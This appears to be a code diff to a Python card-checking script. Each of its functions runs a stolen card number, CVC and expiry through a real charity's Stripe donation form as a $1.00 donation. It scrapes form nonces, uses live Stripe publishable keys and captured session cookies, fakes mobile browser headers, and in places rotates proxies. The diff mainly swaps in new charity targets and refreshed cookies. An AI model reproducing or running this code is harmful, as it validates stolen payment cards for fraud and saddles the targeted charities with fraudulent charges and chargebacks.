@@ -105,7 +105,8 @@ def go0(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://flyingislandspocketpoets.com.au/campaigns/flying-islands-poetry-community-gift-fund/', headers=headers)
+        response = requests.get(
+            'https://flyingislandspocketpoets.com.au/campaigns/flying-islands-poetry-community-gift-fund/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -309,6 +310,7 @@ def go1(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
+        
         response = requests.get('https://hilosailing.org/donate/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
@@ -503,10 +505,8 @@ def go2(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get(
-        'https://handsforcharity.ca/mississauga/', 
-        headers=headers,        
-        )
+        
+        response = requests.get('https://handsforcharity.ca/mississauga/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -875,26 +875,28 @@ def go4(cc_input: str) -> str:
         corr = generate_random_code()
         sess = generate_random_code()
 
-        proxy = get_random_proxy()
-        print(f"Using proxy: {proxy['http']}")  
+#        proxy = get_random_proxy()
+#        print(f"Using proxy: {proxy['http']}")  
       
         #1
         headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': user,
+            'authority': 'nanda.org',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'cache-control': 'max-age=0',
+            # 'cookie': 'charitable_session=028bb31d8c8cda271c3324f85685aeeb||86400||82800; _ga=GA1.1.1635111792.1766984128; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-29%2004%3A55%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-12-29%2004%3A55%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; __stripe_mid=77f88749-f5aa-422c-9f7d-d9ca9aed99559eaa39; __stripe_sid=f398b709-3665-4086-b4a6-2f8dc60b67258843ad; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F; _ga_24R744NQFJ=GS2.1.s1766984127$o1$g1$t1766984910$j60$l0$h0',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': user,
         }
-        response = requests.get('https://nanda.org/nanda-i-foundation/support-nanda-foundation/', headers=headers, proxies=proxy)
+        
+        response = requests.get('https://nanda.org/nanda-i-foundation/support-nanda-foundation/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -906,23 +908,23 @@ def go4(cc_input: str) -> str:
         	
         #2
         headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'pragma': 'no-cache',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': user,
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user,
         }
-        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+card-element&referrer=https%3A%2F%2Fnanda.org&time_on_page=31306&client_attribution_metadata[client_session_id]=19d06d28-c917-4d60-9656-92d961c4ec44&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Mosx3KEssoNl8ScsWR4VQojp8Rofrf8eVjiFS34QVJLbLTExFsVah44zWW8AgF7vbRGz3SOxQeA9511AcmtFQF200izpe2876'
+        
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][postal_code]=10002&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fnanda.org&time_on_page=40644&client_attribution_metadata[client_session_id]=8fcfbd26-1b1c-4d6b-9b96-1f8f6cca5524&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Mosx3KEssoNl8ScsWR4VQojp8Rofrf8eVjiFS34QVJLbLTExFsVah44zWW8AgF7vbRGz3SOxQeA9511AcmtFQF200izpe2876'
+        
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
         pm = res_json.get('id')
@@ -933,65 +935,61 @@ def go4(cc_input: str) -> str:
                 
         #3
         cookies = {
-    'charitable_session': 'ceb3641a164082fc101a8bab6480b676||86400||82800',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-12-13%2019%3A06%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2025-12-13%2019%3A06%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F',
-    'cookielawinfo-checkbox-necessary': 'yes',
-    'cookielawinfo-checkbox-non-necessary': 'yes',
-    '_ga': 'GA1.1.1526604562.1765650992',
-    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9',
-    'viewed_cookie_policy': 'yes',
-    '__stripe_mid': '845dea7a-53f8-4272-aef1-757438bc743ec08807',
-    '__stripe_sid': 'cda706fc-cf43-4d9b-88ad-794e37131fa8c6e5b2',
-    '_ga_24R744NQFJ': 'GS2.1.s1765650991$o1$g0$t1765651002$j49$l0$h0',
+            'charitable_session': '028bb31d8c8cda271c3324f85685aeeb||86400||82800',
+            '_ga_24R744NQFJ': 'GS2.1.s1766984127$o1$g0$t1766984127$j60$l0$h0',
+            '_ga': 'GA1.1.1635111792.1766984128',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-12-29%2004%3A55%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-12-29%2004%3A55%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
+            'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F',
+            'cookielawinfo-checkbox-necessary': 'yes',
+            'cookielawinfo-checkbox-non-necessary': 'yes',
+            'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9',
+            'viewed_cookie_policy': 'yes',
+            '__stripe_mid': '77f88749-f5aa-422c-9f7d-d9ca9aed99559eaa39',
+            '__stripe_sid': 'f398b709-3665-4086-b4a6-2f8dc60b67258843ad',
         }
+        
         headers = {
-    'authority': 'nanda.org',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://nanda.org',
-    'pragma': 'no-cache',
-    'referer': 'https://nanda.org/nanda-i-foundation/support-nanda-foundation/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': user,
-    'x-requested-with': 'XMLHttpRequest',
+            'authority': 'nanda.org',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': 'charitable_session=028bb31d8c8cda271c3324f85685aeeb||86400||82800; _ga_24R744NQFJ=GS2.1.s1766984127$o1$g0$t1766984127$j60$l0$h0; _ga=GA1.1.1635111792.1766984128; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-29%2004%3A55%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-12-29%2004%3A55%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnanda.org%2Fnanda-i-foundation%2Fsupport-nanda-foundation%2F; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; __stripe_mid=77f88749-f5aa-422c-9f7d-d9ca9aed99559eaa39; __stripe_sid=f398b709-3665-4086-b4a6-2f8dc60b67258843ad',
+            'origin': 'https://nanda.org',
+            'referer': 'https://nanda.org/nanda-i-foundation/support-nanda-foundation/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
         }
+        
         data = {
-    'charitable_form_id': f'{form_id}',
-    f'{form_id}': '',
-    '_charitable_donation_nonce': f'{donation_nonce}',
-    '_wp_http_referer': '/nanda-i-foundation/support-nanda-foundation/',
-    'campaign_id': f'{campaign_id}',
-    'description': 'NANDA Foundation Donations',
-    'ID': f'{donation_id}',
-    'gateway': 'stripe',
-    'custom_donation_amount': '1.00',
-    'first_name': 'Tiana',
-    'last_name': 'Jakubowski',
-    'email': email,
-    'stripe_payment_method': f'{pm}',
-    'action': 'make_donation',
-    'form_action': 'make_donation',
+            'charitable_form_id': f'{form_id}',
+            f'{form_id}': '',
+            '_charitable_donation_nonce': f'{donation_nonce}',
+            '_wp_http_referer': '/nanda-i-foundation/support-nanda-foundation/',
+            'campaign_id': f'{campaign_id}',
+            'description': 'NANDA Foundation Donations',
+            'ID': f'{donation_id}',
+            'gateway': 'stripe',
+            'custom_donation_amount': '1.00',
+            'first_name': 'Gen',
+            'last_name': 'Paypal',
+            'email': email,
+            'stripe_payment_method': f'{pm}',
+            'action': 'make_donation',
+            'form_action': 'make_donation',
         }
-        response = requests.post(
-    'https://nanda.org/wp-admin/admin-ajax.php',
-    cookies=cookies,
-    headers=headers,
-    data=data,#, proxies=proxy, timeout=30)
-    proxies=proxy,    
-        )
+        
+        response = requests.post('https://nanda.org/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -1671,7 +1669,7 @@ def go8(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://keepnaturealive.de/campaigns/crfev/donate/', headers=headers)
+        response = requests.get('https://gods-dna.com/campaigns/donate-clothing-blankets-household-goods-etc/donate/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -1683,23 +1681,23 @@ def go8(cc_input: str) -> str:
         	
         #2
         headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'pragma': 'no-cache',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': user,
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user,
         }
-        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=DE&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fkeepnaturealive.de&time_on_page=29218&client_attribution_metadata[client_session_id]=27535783-ac9b-414d-ac91-b11d2d687921&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51IadOaEenfgvdQ2uXrRsYOOGtj97lmwqWGAGCtiInGBKVfoSRTZ4na9IT93C1Bje98an0IJIOIsOzhAbqZbqH3ue00ZrQ8wltR'
+        
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=US&billing_details[address][postal_code]=10002&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fgods-dna.com&time_on_page=31687&client_attribution_metadata[client_session_id]=b7898d10-3066-4d12-b150-d3ee91400645&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51P5cEKLPKIuFJVL21f177uGwZrTmpfiNidDlHNtbaOpcXEUTmDB5ibBvKW5O37ahAyfBzuTNQ4QiAJHn3BLmmBTx00ja35XFdT'
+        
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
         pm = res_json.get('id')
@@ -1710,36 +1708,66 @@ def go8(cc_input: str) -> str:
                 
         #3
         cookies = {
-    'cookie_notice_accepted': 'true',
-    '__stripe_mid': '6ca63d23-a05c-45a6-b8f5-683785a56fff9ef17d',
-    'charitable_session': 'b0799009a13b3099d23ad78213755960||86400||82800',
-    '__stripe_sid': '7654bc4b-85b4-415f-8de2-8b7850ffeb01e54711',
+            'charitable_session': '2e870f0b15b7ec8b7517e12588c9ee59||86400||82800',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-12-29%2004%3A40%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+            'sbjs_first_add': 'fd%3D2025-12-29%2004%3A40%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+            'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
+            'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F',
+            'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
+            'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
+            'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
+            'tk_ai': 'HVibdSc+HF3H/QFkrPiTYiXR',
+            '__stripe_mid': '28300acb-8ef7-4687-b261-61418c999a5bad3f06',
+            '__stripe_sid': '2a24d694-d1fd-4a90-9899-5072d90ccd6ae3ded2',
         }
+        
         headers = {
-    'authority': 'keepnaturealive.de',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://keepnaturealive.de',
-    'pragma': 'no-cache',
-    'referer': 'https://keepnaturealive.de/campaigns/crfev/donate/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': user,
-    'x-requested-with': 'XMLHttpRequest',
+            'authority': 'gods-dna.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': 'charitable_session=2e870f0b15b7ec8b7517e12588c9ee59||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-29%2004%3A40%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-12-29%2004%3A40%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F; tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; tk_ai=HVibdSc+HF3H/QFkrPiTYiXR; __stripe_mid=28300acb-8ef7-4687-b261-61418c999a5bad3f06; __stripe_sid=2a24d694-d1fd-4a90-9899-5072d90ccd6ae3ded2',
+            'origin': 'https://gods-dna.com',
+            'referer': 'https://gods-dna.com/campaigns/donate-clothing-blankets-household-goods-etc/donate/',
